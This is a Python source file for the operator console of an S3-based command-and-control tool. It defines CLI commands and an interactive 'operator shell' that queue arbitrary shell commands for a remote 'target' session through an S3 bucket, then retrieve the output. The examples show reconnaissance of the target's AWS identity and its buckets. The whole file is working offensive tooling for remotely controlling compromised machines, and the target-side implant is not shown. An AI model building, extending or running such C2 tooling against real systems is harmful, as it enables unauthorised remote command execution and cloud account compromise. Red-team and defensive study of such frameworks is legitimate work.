"""S3 C2 — session interaction commands."""

import time
import click

from c2.core.config import get_config
from c2.core.s3_protocol import (
    generate_response_url,
    poll_for_output,
    read_output,
    write_command,
    write_idle,
)


def _get_current_seq(bucket: str, session_id: str, region: str) -> int:
    """Read current seq from the session's S3 cmd object. Returns 0 if not found."""
    seq, _ = _get_session_state(bucket, session_id, region)
    return seq


def _get_session_state(bucket: str, session_id: str, region: str) -> tuple[int, str | None]:
    """Read seq and pending cmd from S3. Returns (seq, cmd) or (0, None) if not found."""
    import json

    import boto3

    try:
        s3 = boto3.client("s3", region_name=region)
        obj = s3.get_object(Bucket=bucket, Key=f"sessions/{session_id}/cmd")
        data = json.loads(obj["Body"].read())
        return data.get("seq", 0), data.get("cmd")
    except Exception:
        return 0, None


@click.command()
@click.argument("command")
@click.option("--session", "-s", required=True, help="Session ID")
def send(command, session):
    """
    Write a command to S3 for the target session.
    \b
    Examples:
      c2 send "whoami" -s sess_abc123
      c2 send "aws sts get-caller-identity" -s sess_abc123
    """
    config = get_config()
    bucket = config.s3_c2_bucket
    region = config.aws_region

    seq = _get_current_seq(bucket, session, region) + 1
    response_url = generate_response_url(bucket, session, seq, region=region)
    write_command(bucket, session, seq, command, response_url, region=region)

    click.echo(f"[+] Command sent (seq={seq}): {command}")
    click.echo(f"[*] Retrieve output: s3-c2 receive -s {session} --seq {seq}")


@click.command()
@click.option("--session", "-s", required=True, help="Session ID")
@click.option("--seq", required=True, type=int, help="Sequence number to fetch")
@click.option(
    "--wait",
    "-w",
    default=60,
    type=int,
    help="Wait up to N seconds for output (default: 60)",
)
@click.option(
    "--poll-interval",
    default=2,
    type=int,
    help="Polling interval in seconds (default: 2)",
)
def receive(session, seq, wait, poll_interval):
    """
    Poll S3 for command output at the given sequence number.
    \b
    Examples:
      c2 receive -s sess_abc123 --seq 1
      c2 receive -s sess_abc123 --seq 3 --wait 120
    """
    config = get_config()
    bucket = config.s3_c2_bucket
    region = config.aws_region

    click.echo(f"[*] Polling for output (seq={seq}, timeout={wait}s)...")
    result = poll_for_output(bucket, session, seq, timeout=wait, interval=poll_interval, region=region)

    if result is not None:
        click.echo(f"\n{'-' * 60}")
        click.echo("  Output:")
        click.echo(f"{'-' * 60}")
        click.echo(result)
        click.echo(f"{'-' * 60}")
    else:
        click.echo(f"[!] No output after {wait}s")


@click.command()
@click.option("--session", "-s", required=True, help="Session ID")
def reset(session):
    """
    Write idle state to reset the session (null cmd, seq=0).
    \b
    Example:
      c2 reset -s sess_abc123
    """
    config = get_config()
    write_idle(config.s3_c2_bucket, session, region=config.aws_region)
    click.echo(f"[+] Session {session} reset (idle state written)")


@click.command()
@click.argument("session")
def attach(session):
    """
    Attach to a session interactively.
    \b
    SESSION is the session ID to attach to (e.g., sess_abc123)
    \b
    Example:
      c2 attach sess_abc123
    """
    config = get_config()
    bucket = config.s3_c2_bucket
    region = config.aws_region

    seq = _get_current_seq(bucket, session, region) + 1

    click.echo(f"\n{'=' * 60}")
    click.echo("  S3 C2 Operator Shell")
    click.echo(f"{'=' * 60}")
    click.echo(f"  Session ID: {session}")
    click.echo(f"  S3 Bucket:  {bucket}")
    click.echo(f"  Region:     {region}")

    click.echo(f"\n{'-' * 60}")
    click.echo("  Commands:")
    click.echo(f"{'-' * 60}")
    click.echo("   <command>  - Execute shell command on target")
    click.echo("   status     - Show pending command and current seq")
    click.echo("   reset      - Reset session to idle state")
    click.echo("   exit       - Quit (session stays active)")
    click.echo("   help       - Show this help")
    click.echo(f"{'-' * 60}\n")

    try:
        while True:
            try:
                cmd = click.prompt(f"c2:{session}", prompt_suffix="> ").strip()
            except (KeyboardInterrupt, EOFError):
                click.echo("\n[*] Exiting...")
                break

            if not cmd:
                continue

            if cmd.lower() == "exit":
                click.echo("[*] Exiting (session stays active)...")
                break

            elif cmd.lower() == "status":
                current_seq, pending_cmd = _get_session_state(bucket, session, region)
                if current_seq == 0 and pending_cmd is None:
                    click.echo(f"[*] Session {session}: no state found in S3")
                elif pending_cmd is None:
                    click.echo(f"[*] Session {session}: idle (seq={current_seq})")
                else:
                    click.echo(f"[*] Session {session}: pending cmd={pending_cmd!r} (seq={current_seq})")
                continue

            elif cmd.lower() == "reset":
                write_idle(bucket, session, region=region)
                click.echo("[+] Session reset")
                seq = 1
                continue

            elif cmd.lower() == "help":
                click.echo("\n  Commands:")
                click.echo("   <command>  - Execute shell command on target")
                click.echo("   status     - Show pending command and current seq")
                click.echo("   reset      - Reset session to idle state")
                click.echo("   exit       - Quit (session stays active)")
                click.echo("   help       - Show this help")
                click.echo("\n  Examples:")
                click.echo("   whoami")
                click.echo("   aws sts get-caller-identity")
                click.echo("   aws s3 ls")
                click.echo()
                continue

            else:
                response_url = generate_response_url(
                    bucket, session, seq, region=region
                )
                write_command(bucket, session, seq, cmd, response_url, region=region)
                click.echo(f"[>] Sending: {cmd}")
                click.echo("[+] Command queued")
                click.echo("[*] Waiting for output...\n")

                start_time = time.time()
                timeout = 60
                got_output = False

                tick = 0
                try:
                    while time.time() - start_time < timeout:
                        result = read_output(bucket, session, seq, region=region)
                        if result is not None:
                            click.echo()  # clear progress line
                            click.echo(f"{'-' * 60}")
                            click.echo("  Output:")
                            click.echo(f"{'-' * 60}")
                            click.echo(result)
                            click.echo(f"{'-' * 60}\n")
                            got_output = True
                            break
                        elapsed = int(time.time() - start_time)
                        bar = "." * (tick % 8 + 1)
                        click.echo(
                            f"\r[*] Waiting for output... {elapsed}s [{bar}]       ",
                            nl=False,
                        )
                        tick += 1
                        time.sleep(2)
                except KeyboardInterrupt:
                    click.echo("\n[!] Stopped waiting\n")

                if not got_output:
                    click.echo(f"[!] No output after {timeout}s")

                seq += 1

    except Exception as e:
        click.echo(f"\n[!] Error: {e}", err=True)

    click.echo(f"\n{'=' * 60}")
    click.echo(f"  Session: {session}")
    click.echo(f"  Status: Detached")
    click.echo(f"{'=' * 60}")
    click.echo(f"  To reattach: c2 attach {session}")
    click.echo(f"{'=' * 60}\n")
